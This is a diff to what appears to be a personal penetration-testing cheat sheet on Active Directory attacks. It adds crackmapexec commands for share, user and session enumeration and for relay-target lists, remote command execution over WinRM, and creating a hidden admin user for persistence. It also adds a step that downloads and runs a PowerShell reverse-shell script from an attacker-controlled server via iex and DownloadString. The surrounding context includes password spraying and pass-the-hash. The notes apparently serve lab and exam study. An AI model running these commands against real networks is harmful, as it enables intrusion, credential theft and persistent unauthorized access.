@@ -1236,8 +1236,9 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 - CVE-2019-14287 and CVE-2019-16634
 
 # Active Directory Pentesting
-## Enumeration
-- Get domainname from NMAP: `nmap -A 192.168.1.50 -Pn` -> under `NetBIOS_Domain_Name: PENTESTING`
+## Enumeration (use LdapDomainDump and crackmapexec to enumerate)
+- Precondition is to get domainname from NMAP: `nmap -A 192.168.1.50 -Pn` -> under `NetBIOS_Domain_Name: PENTESTING`
+- First, detect if the SMB signing is enabled, which helps us identify machines that could be targeted for stealing hashes and relay attacks.
 
 ### LdapDomainDump
 - Download: `git clone https://github.com/dirkjanm/ldapdomaindump`
@@ -1248,6 +1249,25 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 - Built-in in kali linux
 - Full target AD info: `enum4linux -u ippsec -p Password12345 -a 192.168.1.50`
 - Provides Domain SID, passwords of some users, share enumerations
+
+### crackmapexec
+- Built-in in kali linux
+- enumerate shares (check for READ/WRITE permissions): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-auth --shares`
+- enumerate logged on users (check if they are domain admin): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --loggedon-users`
+- RID enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --rid-brute`
+- local grp enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-groups`
+- Get the active sessions: `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions`
+- Generate a list of relayable hosts (SMB Signing disabled): `crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt`
+- Get the password policy: `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol`
+- Command execution(e.g. wget,ipconfig, whoami/groups): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Invoke-WebRequest -Uri "http://192.168.1.223:8000/users.txt"'`
+- create new user for persistence(in case ippsec change pw): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net user /add admin Password12345'`
+- add user to localgroup: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net local group administrators'`
+
+## Persistence
+### crackmapexec
+- Reverse shell: [Edit this from Kali to Windows](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
+- Transfer to windows: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'iex(New-Object Net.WebClient).DownloadString("http://192.168.223:8000/Invoke-PowerShellTcpOneLine.ps1")'`
+- Reverse shell script will autorun upcon transfer
 
 
 ### test for a quick No-Preauth win without supplying a username
@@ -1263,10 +1283,6 @@ kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.loca
 ### test if credentials are valid
 ```bash
 kerbrute.py -user 'fsmith' -password 'Thestrokes23' -dc-ip 10.10.10.175 -domain Egotistical-bank.local
-```
-
-```powershell
-net localgroup Administrators
 ```
 
 ### Powerview
@@ -1312,40 +1328,6 @@ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE" #decrypt cpassword in 
 
 Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts
 Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
-```
-### Crackmapexec
-
-```bash
-# First, detect if the SMB signing is enabled, which helps us identify machines that could be targeted for stealing hashes and relay attacks.
-crackmapexec smb 10.129.204.177
-#Or check using NMAP returned results
-
-# Enumerate users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users
-
-# Perform RID Bruteforce to get users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute
-
-# Enumerate domain groups
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups
-
-# Enumerate local users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users
-
-# Generate a list of relayable hosts (SMB Signing disabled)
-crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt
-
-# Enumerate available shares
-crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares
-
-# Get the active sessions
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions
-
-# Check logged in users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers
-
-# Get the password policy
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
 ```
 
 ### EvilWinRM (used when port 5985 is open)
@@ -1426,8 +1408,9 @@ impacket-secretdump exam.com/apachesvc@192.168.1xx.101
 - Spray with known password on list of found usernames
 ```bash
 # Crackmapexec uses SMB - check if the output shows 'Pwned!'
+# protocols = smb, winrm, 
 # --continue-on-success to avoid stopping at the first valid credentials.
-crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
+crackmapexec <protocol> <target(s)> -u username1 -p password1 password2 --no-bruteforce
 crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
 crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords  --continue-on-success 
 crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --continue-on-success
@@ -1441,6 +1424,7 @@ kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
 
 ### Pass the hash (lateral movement) for NTLM only
+
 
 - Access local SAM database and dump all local hashes
 ```powershell
